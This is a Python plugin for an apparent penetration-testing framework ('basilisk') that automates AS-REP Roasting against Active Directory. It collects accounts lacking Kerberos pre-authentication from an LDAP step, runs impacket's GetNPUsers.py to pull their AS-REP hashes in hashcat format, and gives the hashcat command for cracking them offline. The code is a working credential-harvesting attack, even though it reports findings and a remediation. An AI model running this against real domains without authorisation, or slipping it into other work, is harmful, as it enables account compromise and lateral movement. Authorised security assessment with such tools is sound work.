"""AS-REP Roasting — accounts without Kerberos pre-authentication."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)


class AsrepRoastPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="asrep_roast",
        display_name="AS-REP Roasting",
        category=PluginCategory.LATERAL,
        description="Find accounts without pre-auth → request AS-REP → offline crack",
        depends_on=["ldap_enum"],
        produces=["kerberos_tickets", "credentials"],
        timeout=60.0,
        requires_http=False,
        risk_level="noisy",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"asrep_users": [], "hashes": []}

        # Get AS-REP roastable users from ldap_enum
        ldap_result = ctx.pipeline.get(f"ldap_enum:{target.host}")
        asrep_users = []
        if ldap_result and ldap_result.ok:
            asrep_users = ldap_result.data.get("asrep_users", [])

        if not asrep_users and ctx.ldap:
            try:
                users = await ctx.ldap.get_asrep_roastable()
                asrep_users = [
                    u.get("sAMAccountName", "") for u in users
                ]
            except Exception as exc:
                logger.debug("LDAP AS-REP query failed: %s", exc)

        if not asrep_users:
            findings.append(Finding.info(
                "No AS-REP roastable accounts found",
                tags=["lateral", "kerberos"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        data["asrep_users"] = asrep_users[:50]

        # Request AS-REP hashes using impacket
        if ctx.subprocess_mgr:
            domain = target.meta.get("ad_domain", "")
            dc_ip = target.meta.get("dc_ip", target.host)

            if domain:
                cmd = (
                    f"GetNPUsers.py {domain}/ -dc-ip {dc_ip} "
                    f"-usersfile /dev/stdin -format hashcat -outputfile /tmp/asrep.txt"
                )
                result = await ctx.subprocess_mgr.run(
                    cmd, timeout=30,
                )
                if result.returncode == 0 and result.stdout:
                    data["hashes"] = [
                        h for h in result.stdout.strip().splitlines()
                        if "$krb5asrep$" in h
                    ]

        findings.append(Finding.high(
            f"AS-REP roastable accounts: {len(asrep_users)}",
            evidence="\n".join(str(u) for u in asrep_users[:15]),
            description=(
                "These accounts do not require Kerberos pre-authentication. "
                "AS-REP can be requested without credentials and cracked offline."
            ),
            remediation="Enable Kerberos pre-authentication for all accounts",
            tags=["lateral", "kerberos", "asrep"],
        ))

        if data["hashes"]:
            findings.append(Finding.critical(
                f"AS-REP hashes obtained: {len(data['hashes'])}",
                evidence="Hashes saved for offline cracking",
                description="Crack with: hashcat -m 18200 asrep.txt wordlist.txt",
                tags=["lateral", "kerberos", "credential"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
